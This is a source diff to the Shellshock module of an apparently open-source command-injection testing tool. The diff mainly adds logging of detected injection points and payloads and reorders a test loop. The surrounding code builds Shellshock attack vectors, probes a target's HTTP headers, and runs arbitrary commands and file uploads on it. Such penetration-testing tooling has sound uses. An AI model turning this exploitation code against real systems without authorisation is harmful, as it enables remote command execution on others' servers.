@@ -6,7 +6,9 @@ import sys
 import urllib2
 
 from src.utils import menu
+from src.utils import logs
 from src.utils import settings
+
 from src.thirdparty.colorama import Fore, Back, Style, init
 
 from src.core.requests import headers
@@ -39,18 +41,21 @@ def shellshock_payloads(cve, attack_vector):
     pass
   return payload
 
+
 """
 Shellshock bug exploitation
 """
 def shellshock_exploitation(cve, cmd):
-  attack_vector = " echo; " + cmd + "; "
+  attack_vector = " echo; " + cmd + ";"
   payload = shellshock_payloads(cve, attack_vector)
   return payload
+
 
 """
 Enumeration Options
 """
 def enumeration(url, cve, check_header):
+
   #-------------------------------
   # Hostname enumeration
   #-------------------------------
@@ -292,15 +297,19 @@ def file_access(url, cve, check_header):
      sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + Style.RESET_ALL)
      sys.stdout.flush()
 
+
 """
 The main shellshock handler
 """
-def shellshock_handler(url, http_request_method):
+def shellshock_handler(url, http_request_method, filename):
+
+  counter = 1
+  vp_flag = True
   no_result = True
+  export_injection_info = False
 
   injection_type = "results-based command injection"
   technique = "shellshock injection technique"
-  shellshoked = False
 
   sys.stdout.write("(*) Testing the "+ technique + "... ")
   sys.stdout.flush()
@@ -308,8 +317,8 @@ def shellshock_handler(url, http_request_method):
   try: 
     i = 0
     total = len(shellshock_cves) * len(headers)
-    for check_header in headers:
-      for cve in shellshock_cves:
+    for cve in shellshock_cves:
+      for check_header in headers:
         i = i + 1
         attack_vector = "echo " + cve + ":Done;"
         payload = shellshock_payloads(cve, attack_vector)
@@ -336,6 +345,14 @@ def shellshock_handler(url, http_request_method):
 
           sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
           sys.stdout.flush()
+
+          # Print the findings to log file.
+          if export_injection_info == False:
+            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
+          if vp_flag == True:
+            vuln_parameter = "HTTP Header"
+            vp_flag = logs.add_parameter(vp_flag, filename, check_header, vuln_parameter, payload)
+          logs.upload_payload(filename, counter, payload) 
 
         if cve in response.info():
           no_result = False
@@ -393,10 +410,12 @@ def shellshock_handler(url, http_request_method):
   except urllib2.URLError, err:
     print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
 
+
 """
 Execute user commands
 """
 def cmd_exec(url, cmd, cve, check_header):
+
   """
   Check for shellshock 'shell'
   """
@@ -425,14 +444,16 @@ def cmd_exec(url, cmd, cve, check_header):
     if len(shell) == 0:
       cmd = "/usr" + cmd
       shell = check_for_shell(url, cmd, cve, check_header)
-  return shell 
+
+  return shell
+
 
 """
 The exploitation function.
 (call the injection handler)
 """
-def exploitation(url, http_request_method):       
-  if shellshock_handler(url, http_request_method) == False:
+def exploitation(url, http_request_method, filename):       
+  if shellshock_handler(url, http_request_method, filename) == False:
     return False
 
 # eof
